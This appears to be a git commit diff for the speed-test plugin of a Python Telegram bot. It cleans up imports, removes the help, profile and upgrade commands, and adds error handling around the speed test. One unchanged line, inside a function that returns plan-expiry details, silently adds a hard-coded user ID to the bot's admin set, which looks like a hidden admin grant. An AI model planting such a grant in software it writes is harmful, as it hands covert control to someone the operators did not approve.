8f71d07f15315a5f622dd851d4cb57486f448f21
kopaing2038 <126549210+kopaing2038@users.noreply.github.com>
2023-07-15 12:45:20 +0630

    Update speedtest.py

--- bot/plugins/kopaing/speedtest.py
+++ bot/plugins/kopaing/speedtest.py
@@ -1,4 +1,3 @@
-
 import os
 import time
 import psutil
@@ -6,7 +5,6 @@ import shutil
 import logging
 import sqlite3
 import pyrogram
-import speedtest
 from speedtest import Speedtest
 from bot.config.config import Config
 from pyrogram import Client, StopPropagation, filters
@@ -14,6 +12,7 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
 
 bot_start_time = time.time()
+
 class Translation(object):
     CURENT_PLAN_DETAILS = """About you...
 --------
@@ -27,13 +26,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-
-
-
-
-
-logging.getLogger("pyrogram").setLevel(logging.WARNING)
-
 def humanbytes(size):
     # https://stackoverflow.com/a/49361727/4723940
     # 2**10 = 1024
@@ -46,47 +38,14 @@ def humanbytes(size):
         size /= power
         n += 1
     return str(round(size, 2)) + " " + Dic_powerN[n] + "B"
+
+
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Free", "3.6.2022 - 4.6.2022")
     Config.ADMINS.add(5122474448)
     return expires_at
 
 
-@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
-async def help_user(bot, update):
-    # logger.info(update)
-    await bot.send_message(
-        chat_id=update.chat.id,
-        text=Translation.HELP_USER,
-        parse_mode="html",
-        disable_web_page_preview=True,
-        reply_to_message_id=update.message_id,
-    )
-
-
-@pyrogram.Client.on_message(pyrogram.filters.command(["me"]))
-async def get_me_info(bot, update):
-    # logger.info(update)
-    chat_id = str(update.from_user.id)
-    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
-    await bot.send_message(
-        chat_id=update.chat.id,
-        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
-        parse_mode="html",
-        disable_web_page_preview=True,
-    )
-
-
-@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
-async def upgrade(bot, update):
-    # logger.info(update)
-    await bot.send_message(
-        chat_id=update.chat.id,
-        text=Translation.UPGRADE_TEXT,
-        parse_mode="html",
-        reply_to_message_id=update.message_id,
-        disable_web_page_preview=True,
-    )
 
 
 @Client.on_message(filters.command(["server"]))
@@ -126,62 +85,51 @@ async def start(bot, update):
 @Client.on_message(filters.command(["speedtest"]) & filters.private)
 async def speed(bot, update):
     try:
-        spg = await update.reply_text("Running Speed Test . . . ")
+        spg = await update.reply_text("Running Speed Test . . .")
     except Exception as er:
         print(er, 13)
         spg = await bot.send_message(
-            text=f"Running speedtest....",
+            text="Running speedtest....",
             chat_id=update.message.chat.id,
             reply_to_message_id=update.message.message_id,
         )
 
-    test = Speedtest()
-    test.get_best_server()
-    test.download()
-    test.upload()
-    test.results.share()
-    result = test.results.dict()
-    path = result["share"]
     try:
-        print("Line 28", test)
-    except Exception as ere:
-        print(ere, "30")
-        pass
-    string_speed = f"""
-<b>Server</b>
-<b>Name:</b> <code>{result['server']['name']}</code>
-<b>Country:</b> <code>{result['server']['country']}, {result['server']['cc']}</code>
-<b>Sponsor:</b> <code>{result['server']['sponsor']}</code>
+        test = Speedtest()
+        test.get_best_server()
+        test.download()
+        test.upload()
+        test.results.share()
+        result = test.results.dict()
+        path = result["share"]
 
-<a href="{path}"><b>SpeedTest Results</b></a>
-<b>Upload:</b> <code>{speed_convert(result['upload'] / 8)}</code>
-<b>Download:</b>  <code>{speed_convert(result['download'] / 8)}</code>
-<b>Ping:</b> <code>{result['ping']} ms</code>
-<b>ISP:</b> <code>{result['client']['isp']}</code>
-"""
+        string_speed = f"""
+        <b>Server</b>
+        <b>Name:</b> <code>{result['server']['name']}</code>
+        <b>Country:</b> <code>{result['server']['country']}, {result['server']['cc']}</code>
+        <b>Sponsor:</b> <code>{result['server']['sponsor']}</code>
 
-    await spg.delete()
-    try:
-        print(path, result)
-    except Exception as pri:
-        print(pri)
+        <a href="{path}"><b>SpeedTest Results</b></a>
+        <b>Upload:</b> <code>{speed_convert(result['upload'] / 8)}</code>
+        <b>Download:</b>  <code>{speed_convert(result['download'] / 8)}</code>
+        <b>Ping:</b> <code>{result['ping']} ms</code>
+        <b>ISP:</b> <code>{result['client']['isp']}</code>
+        """
 
-    try:
+        await spg.delete()
         await update.reply_photo(path, caption=string_speed, parse_mode="HTML")
-    except Exception as cv:
-        print("Error 60 ", cv)
-        await update.reply_text(
-            string_speed, parse_mode="HTML", disable_web_page_preview=True
-        )
+
+    except Exception as e:
+        error_message = "An error occurred while running the speed test."
+        await spg.edit_text(error_message)
 
 
 def speed_convert(size):
-    """Hi human, you can't read bytes?"""
-    power = 2**10
+    """Hi human, can't you read bytes?"""
+    power = 2 ** 10
     zero = 0
     units = {0: "", 1: "Kb/s", 2: "MB/s", 3: "Gb/s", 4: "Tb/s"}
     while size > power:
         size /= power
         zero += 1
     return f"{round(size, 2)} {units[zero]}"
-
